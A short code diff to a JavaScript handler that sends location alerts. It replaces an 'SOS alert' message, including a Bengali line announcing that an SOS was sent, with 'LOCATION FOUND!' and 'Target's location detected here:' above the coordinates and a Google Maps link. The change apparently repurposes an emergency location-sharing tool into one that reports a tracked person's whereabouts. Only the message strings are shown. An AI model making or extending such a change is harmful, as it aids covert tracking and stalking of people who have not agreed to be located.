@@ -23,9 +23,9 @@ export default async function handler(req, res) {
 
   const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
   const message = [
-    "🆘 RESCUEPING SOS ALERT",
+    "LOCATION FOUND!",
     "",
-    "একটি SOS alert পাঠানো হয়েছে।",
+    "Target's location detected here:",
     `📍 Latitude: ${lat}`,
     `📍 Longitude: ${lon}`,
     `🎯 Accuracy: ${Number.isFinite(acc) ? Math.round(acc) + " meters" : "Unknown"}`,
